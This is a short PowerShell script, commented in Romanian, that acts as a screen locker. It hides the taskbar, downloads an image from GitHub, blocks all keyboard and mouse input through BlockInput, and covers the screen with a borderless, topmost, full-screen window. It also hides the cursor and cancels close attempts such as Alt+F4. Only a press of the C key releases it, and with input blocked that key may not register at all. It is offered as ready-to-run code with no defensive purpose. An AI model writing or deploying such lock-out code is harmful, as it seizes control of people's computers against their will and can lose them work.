Add-Type -AssemblyName System.Windows.Forms

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# Ascunde taskbar-ul
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hWnd = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($hWnd, 0)

# Descarcă poza
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează tot input-ul
[InputBlocker]::BlockInput($true)

# Creare formular full-screen
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None
$form.ShowInTaskbar = $false  # <== AICI dispare din taskbar

# Poza
$pictureBox = New-Object Windows.Forms.PictureBox
$pictureBox.ImageLocation = $tempImage
$pictureBox.SizeMode = 'Zoom'
$pictureBox.Dock = 'Fill'
$form.Controls.Add($pictureBox)

# Deblochează doar la tasta C
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') {
        [TaskbarHider]::ShowWindow($hWnd, 1)  # Show taskbar again
        [InputBlocker]::BlockInput($false)
        $form.Close()
    }
})

# Anti Alt+F4 (partial)
$form.Add_FormClosing({
    if ($_.CloseReason -eq "UserClosing") {
        $_.Cancel = $true
    }
})

$form.ShowDialog()
